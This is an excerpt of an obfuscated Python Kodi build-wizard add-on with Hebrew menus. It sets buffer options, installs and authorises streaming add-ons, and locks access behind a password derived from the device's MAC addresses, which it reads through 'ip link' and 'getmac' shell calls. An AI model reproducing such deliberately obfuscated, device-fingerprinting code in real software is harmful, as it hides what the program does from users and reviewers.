		if len (OOOOO0000OOOOO000 )==0 and attrs =={}:#line:1694
			OOOOO0000OOOOO000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0O00O000000OOOO0 )#line:1695
			if len (OOOOO0000OOOOO000 )==0 :#line:1696
				OOOOO0000OOOOO000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0O00O000000OOOO0 )#line:1697
		if isinstance (ret ,str ):#line:1699
			O0O000000O0OOO000 =[]#line:1700
			for OOOO00OO000000O00 in OOOOO0000OOOOO000 :#line:1701
				O00000OO00O0O0O0O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOO00OO000000O00 )#line:1702
				if len (O00000OO00O0O0O0O )==0 :#line:1703
					O00000OO00O0O0O0O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOO00OO000000O00 )#line:1704
				for OOOOOOOOOOO0O0O0O in O00000OO00O0O0O0O :#line:1705
					O0OO0OO000O0OOO0O =OOOOOOOOOOO0O0O0O [0 ]#line:1706
					if O0OO0OO000O0OOO0O in "'\"":#line:1707
						if OOOOOOOOOOO0O0O0O .find ('='+O0OO0OO000O0OOO0O ,OOOOOOOOOOO0O0O0O .find (O0OO0OO000O0OOO0O ,1 ))>-1 :#line:1708
							OOOOOOOOOOO0O0O0O =OOOOOOOOOOO0O0O0O [:OOOOOOOOOOO0O0O0O .find ('='+O0OO0OO000O0OOO0O ,OOOOOOOOOOO0O0O0O .find (O0OO0OO000O0OOO0O ,1 ))]#line:1709
						if OOOOOOOOOOO0O0O0O .rfind (O0OO0OO000O0OOO0O ,1 )>-1 :#line:1711
							OOOOOOOOOOO0O0O0O =OOOOOOOOOOO0O0O0O [1 :OOOOOOOOOOO0O0O0O .rfind (O0OO0OO000O0OOO0O )]#line:1712
					else :#line:1713
						if OOOOOOOOOOO0O0O0O .find (" ")>0 :#line:1714
							OOOOOOOOOOO0O0O0O =OOOOOOOOOOO0O0O0O [:OOOOOOOOOOO0O0O0O .find (" ")]#line:1715
						elif OOOOOOOOOOO0O0O0O .find ("/")>0 :#line:1716
							OOOOOOOOOOO0O0O0O =OOOOOOOOOOO0O0O0O [:OOOOOOOOOOO0O0O0O .find ("/")]#line:1717
						elif OOOOOOOOOOO0O0O0O .find (">")>0 :#line:1718
							OOOOOOOOOOO0O0O0O =OOOOOOOOOOO0O0O0O [:OOOOOOOOOOO0O0O0O .find (">")]#line:1719
					O0O000000O0OOO000 .append (OOOOOOOOOOO0O0O0O .strip ())#line:1721
			OOOOO0000OOOOO000 =O0O000000O0OOO000 #line:1722
		else :#line:1723
			O0O000000O0OOO000 =[]#line:1724
			for OOOO00OO000000O00 in OOOOO0000OOOOO000 :#line:1725
				OOOOO00OOOO00OOOO =u"</"+name #line:1726
				O0000000O00O00O0O =O0O00O000000OOOO0 .find (OOOO00OO000000O00 )#line:1728
				OOO00OOO00OO000OO =O0O00O000000OOOO0 .find (OOOOO00OOOO00OOOO ,O0000000O00O00O0O )#line:1729
				OO0O0OO00OO00O0OO =O0O00O000000OOOO0 .find ("<"+name ,O0000000O00O00O0O +1 )#line:1730
				while OO0O0OO00OO00O0OO <OOO00OOO00OO000OO and OO0O0OO00OO00O0OO !=-1 :#line:1732
					O00O00O00OO0OOOO0 =O0O00O000000OOOO0 .find (OOOOO00OOOO00OOOO ,OOO00OOO00OO000OO +len (OOOOO00OOOO00OOOO ))#line:1733
					if O00O00O00OO0OOOO0 !=-1 :#line:1734
						OOO00OOO00OO000OO =O00O00O00OO0OOOO0 #line:1735
					OO0O0OO00OO00O0OO =O0O00O000000OOOO0 .find ("<"+name ,OO0O0OO00OO00O0OO +1 )#line:1736
				if O0000000O00O00O0O ==-1 and OOO00OOO00OO000OO ==-1 :#line:1738
					OOOO0OO00OO0OOO00 =u""#line:1739
				elif O0000000O00O00O0O >-1 and OOO00OOO00OO000OO >-1 :#line:1740
					OOOO0OO00OO0OOO00 =O0O00O000000OOOO0 [O0000000O00O00O0O +len (OOOO00OO000000O00 ):OOO00OOO00OO000OO ]#line:1741
				elif OOO00OOO00OO000OO >-1 :#line:1742
					OOOO0OO00OO0OOO00 =O0O00O000000OOOO0 [:OOO00OOO00OO000OO ]#line:1743
				elif O0000000O00O00O0O >-1 :#line:1744
					OOOO0OO00OO0OOO00 =O0O00O000000OOOO0 [O0000000O00O00O0O +len (OOOO00OO000000O00 ):]#line:1745
				if ret :#line:1747
					OOOOO00OOOO00OOOO =O0O00O000000OOOO0 [OOO00OOO00OO000OO :O0O00O000000OOOO0 .find (">",O0O00O000000OOOO0 .find (OOOOO00OOOO00OOOO ))+1 ]#line:1748
					OOOO0OO00OO0OOO00 =OOOO00OO000000O00 +OOOO0OO00OO0OOO00 +OOOOO00OOOO00OOOO #line:1749
				O0O00O000000OOOO0 =O0O00O000000OOOO0 [O0O00O000000OOOO0 .find (OOOO0OO00OO0OOO00 ,O0O00O000000OOOO0 .find (OOOO00OO000000O00 ))+len (OOOO0OO00OO0OOO00 ):]#line:1751
				O0O000000O0OOO000 .append (OOOO0OO00OO0OOO00 )#line:1752
			OOOOO0000OOOOO000 =O0O000000O0OOO000 #line:1753
		O000000OOO0O00OOO +=OOOOO0000OOOOO000 #line:1754
	return O000000OOO0O00OOO #line:1756
def addItem (OO0O0O0OOOO000000 ,O0O0OO0O00O0OOOOO ,OO0OO0000O00000OO ,O0OOO00O00OOOOO0O ,O0O000OOOO0O00OO0 ,description =None ):#line:1758
	if description ==None :description =''#line:1759
	description ='[COLOR white]'+description +'[/COLOR]'#line:1760
	OO00OO0O0O000OOOO =sys .argv [0 ]+"?url="+urllib .quote_plus (O0O0OO0O00O0OOOOO )+"&mode="+str (OO0OO0000O00000OO )+"&name="+urllib .quote_plus (OO0O0O0OOOO000000 )+"&iconimage="+urllib .quote_plus (O0OOO00O00OOOOO0O )+"&fanart="+urllib .quote_plus (O0O000OOOO0O00OO0 )#line:1761
	OOO0000O00OOO0OOO =True #line:1762
	O0000O00O00OOO000 =xbmcgui .ListItem (OO0O0O0OOOO000000 ,iconImage =O0OOO00O00OOOOO0O ,thumbnailImage =O0OOO00O00OOOOO0O )#line:1763
	O0000O00O00OOO000 .setInfo (type ="Video",infoLabels ={"Title":OO0O0O0OOOO000000 ,"Plot":description })#line:1764
	O0000O00O00OOO000 .setProperty ("fanart_Image",O0O000OOOO0O00OO0 )#line:1765
	O0000O00O00OOO000 .setProperty ("icon_Image",O0OOO00O00OOOOO0O )#line:1766
	OOO0000O00OOO0OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00OO0O0O000OOOO ,listitem =O0000O00O00OOO000 ,isFolder =False )#line:1767
	return OOO0000O00OOO0OOO #line:1768
def get_params ():#line:1770
		OOO000O00OOO00O00 =[]#line:1771
		OOOO00000O0OOO0O0 =sys .argv [2 ]#line:1772
		if len (OOOO00000O0OOO0O0 )>=2 :#line:1773
				O000OOO0OOOO0OO0O =sys .argv [2 ]#line:1774
				OO0OO00O0OOOO0OOO =O000OOO0OOOO0OO0O .replace ('?','')#line:1775
				if (O000OOO0OOOO0OO0O [len (O000OOO0OOOO0OO0O )-1 ]=='/'):#line:1776
						O000OOO0OOOO0OO0O =O000OOO0OOOO0OO0O [0 :len (O000OOO0OOOO0OO0O )-2 ]#line:1777
				O0OOO000O0OO00OOO =OO0OO00O0OOOO0OOO .split ('&')#line:1778
				OOO000O00OOO00O00 ={}#line:1779
				for O000O00OO0OOOOO0O in range (len (O0OOO000O0OO00OOO )):#line:1780
						O0000O0O000OOO000 ={}#line:1781
						O0000O0O000OOO000 =O0OOO000O0OO00OOO [O000O00OO0OOOOO0O ].split ('=')#line:1782
						if (len (O0000O0O000OOO000 ))==2 :#line:1783
								OOO000O00OOO00O00 [O0000O0O000OOO000 [0 ]]=O0000O0O000OOO000 [1 ]#line:1784
		return OOO000O00OOO00O00 #line:1786
def decode (O0O00O000O00OO000 ,O0O0OO00O0000OOO0 ):#line:1791
    import base64 #line:1792
    OOOO0OOOOOOO0O00O =[]#line:1793
    if (len (O0O00O000O00OO000 ))!=4 :#line:1795
     return 10 #line:1796
    O0O0OO00O0000OOO0 =base64 .urlsafe_b64decode (O0O0OO00O0000OOO0 )#line:1797
    for OOOO0OOOOO0OO0OOO in range (len (O0O0OO00O0000OOO0 )):#line:1799
        OOO0O00O0O0O000O0 =O0O00O000O00OO000 [OOOO0OOOOO0OO0OOO %len (O0O00O000O00OO000 )]#line:1800
        OO0OOO000O00O0000 =chr ((256 +ord (O0O0OO00O0000OOO0 [OOOO0OOOOO0OO0OOO ])-ord (OOO0O00O0O0O000O0 ))%256 )#line:1801
        OOOO0OOOOOOO0O00O .append (OO0OOO000O00O0000 )#line:1802
    return "".join (OOOO0OOOOOOO0O00O )#line:1803
def tmdb_list (O0O0O0O0O00O0OOOO ):#line:1804
    OO0O000OOO0O0OOOO =decode ("7643",O0O0O0O0O00O0OOOO )#line:1807
    return int (OO0O000OOO0O0OOOO )#line:1810
def u_list (O0OOO0O00000O0O0O ):#line:1811
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1813
        from math import sqrt #line:1814
        O00O000OOOO0OO000 =tmdb_list (TMDB_NEW_API )#line:1815
        O0O000OO000OOOOOO =str ((getHwAddr ('eth0'))*O00O000OOOO0OO000 )#line:1817
        OO00O000OO00OO000 =int (O0O000OO000OOOOOO [1 ]+O0O000OO000OOOOOO [2 ]+O0O000OO000OOOOOO [5 ]+O0O000OO000OOOOOO [7 ])#line:1818
        O0O0000000O00O0OO =(ADDON .getSetting ("pass"))#line:1820
        O00OO0O0OO00000OO =(str (round (sqrt ((OO00O000OO00OO000 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1825
        if '.'in O00OO0O0OO00000OO :#line:1827
         O00OO0O0OO00000OO =(str (round (sqrt ((OO00O000OO00OO000 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1828
        if O0O0000000O00O0OO ==O00OO0O0OO00000OO :#line:1830
          O0O0O00OO00000O0O =O0OOO0O00000O0O0O #line:1832
        else :#line:1834
           if STARTP2 ()and STARTP ()=='ok':#line:1835
             return O0OOO0O00000O0O0O #line:1838
           O0O0O00OO00000O0O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1839
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1840
           sys .exit ()#line:1841
        return O0O0O00OO00000O0O #line:1842
    else :#line:1843
        STARTP ()#line:1844
def disply_hwr ():#line:1848
   try :#line:1849
    O0000O0000O0OOO00 =tmdb_list (TMDB_NEW_API )#line:1850
    O00O00OOOOO00OOO0 =str ((getHwAddr ('eth0'))*O0000O0000O0OOO00 )#line:1851
    O00OOO0O000OO0O0O =(O00O00OOOOO00OOO0 [1 ]+O00O00OOOOO00OOO0 [2 ]+O00O00OOOOO00OOO0 [5 ]+O00O00OOOOO00OOO0 [7 ])#line:1858
    O000OOOOOO00OOO0O =(ADDON .getSetting ("action"))#line:1859
    wiz .setS ('action',str (O00OOO0O000OO0O0O ))#line:1861
   except :pass #line:1862
def disply_hwr2 ():#line:1863
   try :#line:1864
    O000000O0O000OOO0 =tmdb_list (TMDB_NEW_API )#line:1865
    OO00OO00O0000OOOO =str ((getHwAddr ('eth0'))*O000000O0O000OOO0 )#line:1867
    OOOOO000000OOOO0O =(OO00OO00O0000OOOO [1 ]+OO00OO00O0000OOOO [2 ]+OO00OO00O0000OOOO [5 ]+OO00OO00O0000OOOO [7 ])#line:1876
    OOO0O0OO000O0OOO0 =(ADDON .getSetting ("action"))#line:1877
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOOOO000000OOOO0O )#line:1880
   except :pass #line:1881
def getHwAddr (OOOOOOOO0O0000OO0 ):#line:1883
   import subprocess ,time #line:1884
   OOOO0OOO00OOOOOO0 ='windows'#line:1885
   if xbmc .getCondVisibility ('system.platform.android'):#line:1886
       OOOO0OOO00OOOOOO0 ='android'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
     O00OO0OO000OO0OO0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1889
     OOOOOOOO00OOO00OO =re .compile ('link/ether (.+?) brd').findall (str (O00OO0OO000OO0OO0 ))#line:1891
     OOO00O000O0OOO0OO =0 #line:1892
     for OOO00O00O0OO0000O in OOOOOOOO00OOO00OO :#line:1893
      if OOOOOOOO00OOO00OO !='00:00:00:00:00:00':#line:1894
          O0OOOO00OOO0OO000 =OOO00O00O0OO0000O #line:1895
          OOO00O000O0OOO0OO =OOO00O000O0OOO0OO +int (O0OOOO00OOO0OO000 .replace (':',''),16 )#line:1896
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1898
       OOOOO00OO00O00O00 =0 #line:1899
       OOO00O000O0OOO0OO =0 #line:1900
       O000OOOO00OOOO000 =[]#line:1901
       OOO0OOOO0O0OO00OO =os .popen ("getmac").read ()#line:1902
       OOO0OOOO0O0OO00OO =OOO0OOOO0O0OO00OO .split ("\n")#line:1903
       for OO00OO0OO0OOO0O00 in OOO0OOOO0O0OO00OO :#line:1905
            O00O0OO0O0OO0OOOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO00OO0OO0OOO0O00 ,re .I )#line:1906
            if O00O0OO0O0OO0OOOO :#line:1907
                OOOOOOOO00OOO00OO =O00O0OO0O0OO0OOOO .group ().replace ('-',':')#line:1908
                O000OOOO00OOOO000 .append (OOOOOOOO00OOO00OO )#line:1909
                OOO00O000O0OOO0OO =OOO00O000O0OOO0OO +int (OOOOOOOO00OOO00OO .replace (':',''),16 )#line:1912
   else :#line:1914
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1915
   try :#line:1932
    return OOO00O000O0OOO0OO #line:1933
   except :pass #line:1934
def getpass ():#line:1935
	disply_hwr2 ()#line:1937
def setpass ():#line:1938
    O0OOO000O00O00OO0 =xbmcgui .Dialog ()#line:1939
    O000OO0OO0O000000 =''#line:1940
    O0O0OO0000O00O00O =xbmc .Keyboard (O000OO0OO0O000000 ,'הכנס סיסמה')#line:1942
    O0O0OO0000O00O00O .doModal ()#line:1943
    if O0O0OO0000O00O00O .isConfirmed ():#line:1944
           O0O0OO0000O00O00O =O0O0OO0000O00O00O .getText ()#line:1945
    wiz .setS ('pass',str (O0O0OO0000O00O00O ))#line:1946
def setuname ():#line:1947
    O0O0OO000OOO00O00 =''#line:1948
    O0O0O0O00OOO000O0 =xbmc .Keyboard (O0O0OO000OOO00O00 ,'הכנס שם משתמש')#line:1949
    O0O0O0O00OOO000O0 .doModal ()#line:1950
    if O0O0O0O00OOO000O0 .isConfirmed ():#line:1951
           O0O0OO000OOO00O00 =O0O0O0O00OOO000O0 .getText ()#line:1952
           wiz .setS ('user',str (O0O0OO000OOO00O00 ))#line:1953
def powerkodi ():#line:1954
    os ._exit (1 )#line:1955
def buffer1 ():#line:1957
	OOO00OO000000OOOO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1958
	OOOO00000OO0OOO00 =xbmc .getInfoLabel ("System.Memory(total)")#line:1959
	OOO00O0O00O000O0O =xbmc .getInfoLabel ("System.FreeMemory")#line:1960
	O0OOO000000OO0O00 =re .sub ('[^0-9]','',OOO00O0O00O000O0O )#line:1961
	O0OOO000000OO0O00 =int (O0OOO000000OO0O00 )/3 #line:1962
	O00OO00O0OO000OO0 =O0OOO000000OO0O00 *1024 *1024 #line:1963
	try :OOOOO0O0OO0OOOOOO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1964
	except :OOOOO0O0OO0OOOOOO =16 #line:1965
	O000O0O000O00OO00 =DIALOG .yesno ('FREE MEMORY: '+str (OOO00O0O00O000O0O ),'Based on your free Memory your optimal buffersize is: '+str (O0OOO000000OO0O00 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1968
	if O000O0O000O00OO00 ==1 :#line:1969
		with open (OOO00OO000000OOOO ,"w")as OO00OO00O00O000O0 :#line:1970
			if OOOOO0O0OO0OOOOOO >=17 :O00OOOOOO0OOO0000 =xml_data_advSettings_New (str (O00OO00O0OO000OO0 ))#line:1971
			else :O00OOOOOO0OOO0000 =xml_data_advSettings_old (str (O00OO00O0OO000OO0 ))#line:1972
			OO00OO00O00O000O0 .write (O00OOOOOO0OOO0000 )#line:1974
			DIALOG .ok ('Buffer Size Set to: '+str (O00OO00O0OO000OO0 ),'Please restart Kodi for settings to apply.','')#line:1975
	elif O000O0O000O00OO00 ==0 :#line:1977
		O00OO00O0OO000OO0 =_OOO000OOO0OOO00O0 (default =str (O00OO00O0OO000OO0 ),heading ="INPUT BUFFER SIZE")#line:1978
		with open (OOO00OO000000OOOO ,"w")as OO00OO00O00O000O0 :#line:1979
			if OOOOO0O0OO0OOOOOO >=17 :O00OOOOOO0OOO0000 =xml_data_advSettings_New (str (O00OO00O0OO000OO0 ))#line:1980
			else :O00OOOOOO0OOO0000 =xml_data_advSettings_old (str (O00OO00O0OO000OO0 ))#line:1981
			OO00OO00O00O000O0 .write (O00OOOOOO0OOO0000 )#line:1982
			DIALOG .ok ('Buffer Size Set to: '+str (O00OO00O0OO000OO0 ),'Please restart Kodi for settings to apply.','')#line:1983
def xml_data_advSettings_old (OOOO0O0O00OO00OO0 ):#line:1984
	O0OO0O0O00000000O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOOO0O0O00OO00OO0 #line:1994
	return O0OO0O0O00000000O #line:1995
def xml_data_advSettings_New (OOOOOOO0OO00OO00O ):#line:1997
	OO00OO0OO00OO00OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOOOOOO0OO00OO00O #line:2009
	return OO00OO0OO00OO00OO #line:2010
def write_ADV_SETTINGS_XML (OOO00O00O0OOO000O ):#line:2011
    if not os .path .exists (xml_file ):#line:2012
        with open (xml_file ,"w")as OO00OO0OO00OO000O :#line:2013
            OO00OO0OO00OO000O .write (xml_data )#line:2014
def _OOO000OOO0OOO00O0 (default ="",heading ="",hidden =False ):#line:2015
    ""#line:2016
    O0O0000O000O0OO00 =xbmc .Keyboard (default ,heading ,hidden )#line:2017
    O0O0000O000O0OO00 .doModal ()#line:2018
    if (O0O0000O000O0OO00 .isConfirmed ()):#line:2019
        return unicode (O0O0000O000O0OO00 .getText (),"utf-8")#line:2020
    return default #line:2021
def index ():#line:2023
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2024
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2025
	if AUTOUPDATE =='Yes':#line:2026
		if wiz .workingURL (WIZARDFILE )==True :#line:2027
			O000O000OO00O0OO0 =wiz .checkWizard ('version')#line:2028
			if O000O000OO00O0OO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O000O000OO00O0OO0 ),'wizardupdate',themeit =THEME2 )#line:2029
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2030
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2031
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
	if len (BUILDNAME )>0 :#line:2033
		OOO0O0O0OOO00O000 =wiz .checkBuild (BUILDNAME ,'version')#line:2034
		OOOOO0O0O00OO0O00 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2035
		if OOO0O0O0OOO00O000 >BUILDVERSION :OOOOO0O0O00OO0O00 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOOOO0O0O00OO0O00 ,OOO0O0O0OOO00O000 )#line:2036
		addDir (OOOOO0O0O00OO0O00 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2038
		try :#line:2040
		     O00O0OOO000OO0000 =wiz .themeCount (BUILDNAME )#line:2041
		except :#line:2042
		   O00O0OOO000OO0000 =False #line:2043
		if not O00O0OOO000OO0000 ==False :#line:2044
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2045
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2046
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2049
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2050
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2051
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2055
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2057
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2059
def morsetup ():#line:2061
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2062
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2066
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2070
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2071
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2074
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2075
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2085
	setView ('files','viewType')#line:2086
def morsetup2 ():#line:2087
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2088
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
def fastupdate ():#line:2099
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2100
def forcefastupdate ():#line:2102
			OO0OO0O0OOO0O00OO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2103
			wiz .ForceFastUpDate (ADDONTITLE ,OO0OO0O0OOO0O00OO )#line:2104
def rdsetup ():#line:2108
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2110
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2113
def traktsetup ():#line:2116
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	setView ('files','viewType')#line:2124
def setautorealdebrid ():#line:2125
    from resources .libs import real_debrid #line:2126
    OO0OOOO0O0O00OO0O =real_debrid .RealDebridFirst ()#line:2127
    OO0OOOO0O0O00OO0O .auth ()#line:2128
def setrealdebrid ():#line:2130
    OOOOO0O0OO000OO0O =(ADDON .getSetting ("auto_rd"))#line:2131
    if OOOOO0O0OO000OO0O =='false':#line:2132
       ADDON .openSettings ()#line:2133
    else :#line:2134
        from resources .libs import real_debrid #line:2135
        O0OO0OOOO000OOOO0 =real_debrid .RealDebrid ()#line:2136
        O0OO0OOOO000OOOO0 .auth ()#line:2137
        rdon ()#line:2140
def resolveurlsetup ():#line:2142
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2143
def urlresolversetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2145
def placentasetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2148
def reptiliasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2150
def flixnetsetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2152
def yodasetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2154
def numberssetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2156
def uranussetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2158
def genesissetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2160
def net_tools (view =None ):#line:2162
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2163
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2164
	setView ('files','viewType')#line:2166
def speedMenu ():#line:2167
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2168
def viewIP ():#line:2169
	O00OOOO000O00OOOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2183
	OO0OO00O000OOOO00 =[];OO0O00O0O00O00O0O =0 #line:2184
	for O00OO00OOOOO0O00O in O00OOOO000O00OOOO :#line:2185
		O0O0O00000OO00OOO =wiz .getInfo (O00OO00OOOOO0O00O )#line:2186
		OO0000000O00O0OO0 =0 #line:2187
		while O0O0O00000OO00OOO =="Busy"and OO0000000O00O0OO0 <10 :#line:2188
			O0O0O00000OO00OOO =wiz .getInfo (O00OO00OOOOO0O00O );OO0000000O00O0OO0 +=1 ;wiz .log ("%s sleep %s"%(O00OO00OOOOO0O00O ,str (OO0000000O00O0OO0 )));xbmc .sleep (1000 )#line:2189
		OO0OO00O000OOOO00 .append (O0O0O00000OO00OOO )#line:2190
		OO0O00O0O00O00O0O +=1 #line:2191
	OOO0OO0000OOO0OOO ,OO0O00O000O0O000O ,OO0OOO0OOO00O0000 =getIP ()#line:2192
